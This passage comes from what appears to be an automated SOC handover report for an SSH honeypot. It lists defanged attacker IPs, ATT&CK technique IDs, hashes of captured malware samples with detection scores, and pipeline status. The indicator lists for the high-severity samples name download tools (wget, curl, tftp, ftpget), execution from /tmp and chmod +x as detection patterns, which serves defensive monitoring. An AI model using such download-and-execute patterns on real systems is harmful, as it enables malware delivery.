| `194.165.16[.]164` | **3** | 2026-08-04 18:31 | 2026-08-04 18:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | **3** | 2026-08-04 17:10 | 2026-08-04 17:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **3** | 2026-08-04 17:05 | 2026-08-04 17:34 | 3m | 0 | `T1592` | 🟢 LOW |
| `94.26.106[.]199` | **3** | 2026-08-04 18:20 | 2026-08-04 18:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]240` | **2** | 2026-08-04 17:11 | 2026-08-04 17:13 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `91.233.83[.]203` | **2** | 2026-08-04 17:57 | 2026-08-04 18:08 | 2m | 0 | `T1592` | 🟢 LOW |
| `185.183.95[.]112` | 1 | 2026-08-04 17:44 | 2026-08-04 17:45 | 11s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-08-04 18:04 | 2026-08-04 18:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-08-04 18:43 | 2026-08-04 18:43 | 1s | 0 | `T1592` | 🟢 LOW |
| `65.20.233[.]110` | 1 | 2026-08-04 16:55 | 2026-08-04 16:55 | 1s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]60` | 1 | 2026-08-04 17:55 | 2026-08-04 17:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `78.66.45[.]101` | 1 | 2026-08-04 18:17 | 2026-08-04 18:19 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **33/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 59/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `93.152.221[.]206` | DE | TechTies Inc. | **100** ⚠️ | 11 |
| `117.158.160[.]42` | CN | China Mobile Communications Corporation | **100** ⚠️ | 46 |
| `146.56.164[.]20` | KR | Oracle Corporation , Global software solutions , California , USA | **100** ⚠️ | 2 |
| `78.66.45[.]101` | SE | Telia Network Services | **100** ⚠️ | 50 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `130.12.182[.]231` | DE | Netiface LLC | **100** ⚠️ | 12 |
| `102.220.160[.]67` | SI | Internet | **100** ⚠️ | 32 |
| `60.172.41[.]103` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `130.12.182[.]223` | DE | Netiface LLC | **100** ⚠️ | 13 |
| `179.184.85[.]167` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 94 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 87 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 3 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 2 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 141 cases |
| Tool 34  | Credential Extractor        | ✅ 99 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 66 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (14.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 50 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 87 priority case(s) shown individually · 14 recon entry/entries in table (8 group(s) consolidating 27 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-04T19:44:11Z_
